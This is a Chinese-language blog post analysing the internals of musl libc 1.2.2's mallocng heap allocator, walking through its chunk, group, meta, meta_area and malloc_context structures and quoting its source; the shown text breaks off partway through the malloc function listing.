<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Musl heap 浅析 - Humoooor&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Humoooor&#039;s Blog"><meta name="msapplication-TileImage" content="/img/MyLogo.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Humoooor&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="浅浅分析一下"><meta property="og:type" content="blog"><meta property="og:title" content="Musl heap 浅析"><meta property="og:url" content="https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"><meta property="og:site_name" content="Humoooor&#039;s Blog"><meta property="og:description" content="浅浅分析一下"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://humoooor.cn/img/Musl_heap_%E6%B5%85%E6%9E%90.assets/Musl_heap_structure.png"><meta property="article:published_time" content="2022-10-10T08:26:00.000Z"><meta property="article:modified_time" content="2023-10-04T11:47:56.207Z"><meta property="article:author" content="Humoooor"><meta property="article:tag" content="Musl libc"><meta property="article:tag" content="Memory Management"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://humoooor.cn/img/Musl_heap_%E6%B5%85%E6%9E%90.assets/Musl_heap_structure.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"},"headline":"Musl heap 浅析","image":["https://humoooor.cn/img/Musl_heap_%E6%B5%85%E6%9E%90.assets/Musl_heap_structure.png"],"datePublished":"2022-10-10T08:26:00.000Z","dateModified":"2023-10-04T11:47:56.207Z","author":{"@type":"Person","name":"Humoooor"},"publisher":{"@type":"Organization","name":"Humoooor's Blog","logo":{"@type":"ImageObject","url":"https://humoooor.cn/img/MyLogo.jpg"}},"description":"浅浅分析一下"}</script><link rel="canonical" href="https://humoooor.cn/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"><link rel="icon" href="/img/MyLogo.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Humoooor's Blog" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/MyLogo.jpg" alt="Humoooor&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friends">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/humoooor"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-10-10T08:26:00.000Z" title="2022/10/10 16:26:00">2022-10-10</time>发表</span><span class="level-item"><time dateTime="2023-10-04T11:47:56.207Z" title="2023/10/4 19:47:56">2023-10-04</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Computer-Science/">Computer Science</a></span><span class="level-item">1 小时读完 (大约7052个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Musl heap 浅析</h1><div class="content"><p>浅浅分析一下</p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>环境：x64 musl-1.2.2</p>
<p>笔者只浅浅分析了 malloc 和 free 的源码，对相关结构没有详细介绍，可配合 xf1les 师傅的<a target="_blank" rel="noopener" href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">文章</a>食用</p>
<h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>实际上源码并没有 chunk 结构体定义，下面是通过 malloc 推测出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> prev_data[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> idx:<span class="number">5</span>;  <span class="comment">// group 的第几个 chunk，从 0 开始</span></span><br><span class="line">    <span class="type">uint8_t</span> reserved:<span class="number">3</span>; <span class="comment">// chunk 没有用到的空间大小，若 reserved = 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">// 相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10</span></span><br><span class="line">    <span class="type">char</span> data[]; <span class="comment">// 用户数据</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>prev_data</strong><ul>
<li>空间复用，前一个 chunk 可以多使用 4 个字节</li>
</ul>
</li>
<li><strong>idx</strong><ul>
<li>group 的第几个 chunk，从 0 开始</li>
</ul>
</li>
<li><strong>reserved</strong><ul>
<li>chunk 没有用到的空间大小</li>
<li>若 reserved == 5，那么会在下一个 chunk 的 prev_data 中记录真实的 reserved</li>
</ul>
</li>
<li><strong>offset</strong><ul>
<li>相对于第一个 chunk 的偏移，实际地址偏移为 offset * 0x10</li>
</ul>
</li>
</ul>
<p>由于内存对齐，每个 chunk 可以使用下一个 chunk 的 4 字节空间</p>
<p>（每个 group 的第一个 chunk 前面有 0x10 个字节 = group + chunk_header）</p>
<h4 id="inuse-chunk"><a href="#inuse-chunk" class="headerlink" title="inuse_chunk"></a>inuse_chunk</h4><p>avail_mask 和 freed_mask 对应的位置都为 0</p>
<h4 id="unuse-chunk"><a href="#unuse-chunk" class="headerlink" title="unuse_chunk"></a>unuse_chunk</h4><ul>
<li><p><strong>avail_chunk</strong></p>
<ul>
<li>内容一般为空</li>
<li>avail_mask 上 idx 对应的位置为 1</li>
</ul>
</li>
<li><p><strong>freed_chunk</strong></p>
<ul>
<li>idx 和 reserved 置为 0xff，offset 置零</li>
<li>freed_mask 上 idx 对应的位置为 1</li>
</ul>
</li>
</ul>
<h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span>							<span class="comment">// 对应的 meta 地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;					<span class="comment">// last_chunk_idx</span></span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];   <span class="comment">// alien</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];					<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由 meta 管理，位于可执行文件的数据段</p>
<ul>
<li><strong>meta</strong><ul>
<li>对应的 meta 地址</li>
</ul>
</li>
<li><strong>active_idx</strong><ul>
<li>可用的 chunk 的最大 idx</li>
</ul>
</li>
<li><strong>pad</strong><ul>
<li>填充位，用于对齐</li>
</ul>
</li>
<li><strong>storage</strong><ul>
<li>存储数据，chunks</li>
</ul>
</li>
</ul>
<h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span>			<span class="comment">// 同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span>					<span class="comment">// 指向对应的 group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;  <span class="comment">// 以位图方式表示 group 中 chunk 状态</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;				<span class="comment">// group 中 chunk 数量</span></span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;				<span class="comment">// meta 是否可以被回收，1 表示可以</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;				<span class="comment">// 作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte）</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>prev</strong>，<strong>next</strong><ul>
<li>同类型且可分配 chunk 的 meta 或 freed_meta 以双向链表的形式连接</li>
</ul>
</li>
<li><strong>mem</strong><ul>
<li>指向对应的 group 地址</li>
</ul>
</li>
<li><strong>avail_mask</strong>，<strong>freed_mask</strong><ul>
<li>以位图方式表示 group 中 chunk 状态，因此一个 group 最多能有 32 个 chunk</li>
<li>0 表示 inuse，1 表示 avail 或 freed</li>
<li>chunk 分为 inuse_chunk、avail_chunk、freed_chunk 三个状态</li>
</ul>
</li>
<li><strong>last_idx</strong><ul>
<li>group 中 chunk 数量</li>
</ul>
</li>
<li><strong>freeable</strong><ul>
<li>meta 是否可以被回收，1 表示可以</li>
</ul>
</li>
<li><strong>sizeclass</strong><ul>
<li>作为 size_classes 的下标，为该 group 中每个 chunk 大小（Byte）</li>
</ul>
</li>
</ul>
<figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">	<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">	<span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">	<span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">	<span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">	<span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">	<span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">	<span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">	<span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">	<span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">	<span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">	<span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>maplen</strong><ul>
<li>若 group 是 mmap 分配的空间，为对应的长度，其他情况为 0</li>
</ul>
</li>
</ul>
<h4 id="avail-meta"><a href="#avail-meta" class="headerlink" title="avail_meta"></a>avail_meta</h4><p>在 meta_area 中按顺序取出，avail_meta = {0}</p>
<h4 id="freed-meta"><a href="#freed-meta" class="headerlink" title="freed_meta"></a>freed_meta</h4><ul>
<li>FIFO，malloc_context 中 freed_meta_head 指向第一个 freed_meta</li>
<li>meta-&gt;mem-&gt;meta = 0</li>
<li>freed_meta = {0}</li>
</ul>
<h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> check;			<span class="comment">// 与 malloc_context 中的 secret 相等，防止伪造 meta</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span>	<span class="comment">// 下一个 meta_area 的地址</span></span><br><span class="line">	<span class="type">int</span> nslots;				<span class="comment">// meta 槽的数量</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span>	<span class="comment">// metas</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>以页为单位分配，是多个 meta 的集合，因此 <code>meta_area_addr = meta_addr &amp; 0xfffffffffffff000</code></p>
<ul>
<li><strong>check</strong><ul>
<li>与 malloc_context 中的 secret 相等，防止伪造 meta</li>
</ul>
</li>
<li><strong>next</strong><ul>
<li>下一个 meta_area 的地址</li>
</ul>
</li>
<li><strong>nslots</strong><ul>
<li>meta 槽的数量</li>
<li>注：在 musl 中 slot 可能指 meta 也可能指 chunk</li>
</ul>
</li>
<li><strong>slots</strong><ul>
<li>存放多个 meta 结构体，metas</li>
</ul>
</li>
</ul>
<h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a>malloc_context</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> secret;					<span class="comment">// 防止伪造 meta</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">	<span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">int</span> init_done;						<span class="comment">// 是否初始化的标记</span></span><br><span class="line">	<span class="type">unsigned</span> mmap_counter;				<span class="comment">// 记录 mmap 出来的 chunk 的数量</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span>		<span class="comment">// 指向 freed_meta 头</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span>			<span class="comment">// 指向 area_areas 中可分配 meta 空间</span></span><br><span class="line">	<span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span> <span class="comment">// 分别指向第一个和最后一个 meta_area</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>			<span class="comment">// 可以分配的 meta 地址，idx 对应着 size_classes 的大小，类似 glibc 的 bins</span></span><br><span class="line">	<span class="type">size_t</span> usage_by_class[<span class="number">48</span>];			<span class="comment">// idx 对应大小的所有 meta 的 chunk 数量</span></span><br><span class="line">	<span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">	<span class="type">uint8_t</span> seq;</span><br><span class="line">	<span class="type">uintptr_t</span> brk;						<span class="comment">// 记录目前的 brk(0)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>位于 libc 的数据段，为全局结构体</p>
<ul>
<li><strong>secret</strong><ul>
<li>防止伪造 meta</li>
</ul>
</li>
<li><strong>free_meta_head</strong><ul>
<li>指向 freed_meta 头</li>
</ul>
</li>
<li><strong>avail_meta</strong><ul>
<li>指向可用 meta 数组</li>
</ul>
</li>
<li><strong>active</strong><ul>
<li>指向一个 meta 双向链表，其中的 meta 一般都有 unuse_chunk</li>
<li>idx 对应着 size_classes 的大小，类似 glibc 的 bins</li>
<li>指向的第一个 meta 一般有 avail_chunk，后面的 meta 一般只有 freed_chunk</li>
</ul>
</li>
<li><strong>usage_by_class</strong><ul>
<li>idx 对应大小的所有 meta 的 group 管理的 chunk 数量</li>
</ul>
</li>
<li><strong>brk</strong><ul>
<li>记录目前的 brk(0)</li>
</ul>
</li>
</ul>
<h3 id="chunk-gt-meta"><a href="#chunk-gt-meta" class="headerlink" title="chunk -&gt; meta"></a>chunk -&gt; meta</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	</span><br><span class="line"><span class="comment">/*  check */</span></span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>取 chunk 的 idx 和 offset</li>
<li>通过 offset 取 group</li>
<li>通过 group-&gt;meta 取 meta</li>
<li>各种检查<ul>
<li>meta-&gt;mem == group</li>
<li>idx &lt;= meta-&gt;last_idx</li>
<li>meta 的 mask 上 idx 对应的位置是否都为 0</li>
<li>meta_area-&gt;check == malloc_context.secret</li>
<li>size_classes[meta-&gt;sizeclass]*(index) &lt;= offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)</li>
</ul>
</li>
</ol>
<h3 id="大概总结一下"><a href="#大概总结一下" class="headerlink" title="大概总结一下"></a>大概总结一下</h3><ul>
<li>malloc_context 作为全局变量，在 libc 数据段</li>
<li>meta_area 作为 meta 的集合，管理着 meta</li>
<li><strong>同类型</strong> 且 <strong>有可分配 chunk</strong> 的 meta 以双向链表形式连接起来，如果 meta 的 chunk 全部分配出去，则会从双向链表中移出</li>
<li>malloc 时，通过 malloc_context 的 active 寻找对应大小的可使用的 meta，类似 glibc 的 bins<ul>
<li>malloc_context 的 active 指向的第一个 meta 一般是有 avail_chunk 或者 freed_chunk（或所有 chunk 刚好分配完），此 meta 后面的 meta 一般只有 freed_chunk</li>
<li>malloc_context 的 freed_meta_head 指向 freed_meta 链表</li>
</ul>
</li>
</ul>
<p><img src="/img/Musl_heap_%E6%B5%85%E6%9E%90.assets/Musl_heap_structure.png" alt="Musl heap structure"></p>
<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="comment">// sizeclass</span></span><br><span class="line">	<span class="type">int</span> sc;	</span><br><span class="line">	<span class="type">int</span> idx;</span><br><span class="line">	<span class="type">int</span> ctr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmap 分配</span></span><br><span class="line">    <span class="comment">// #define MMAP_THRESHOLD 131052</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock();</span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta();</span><br><span 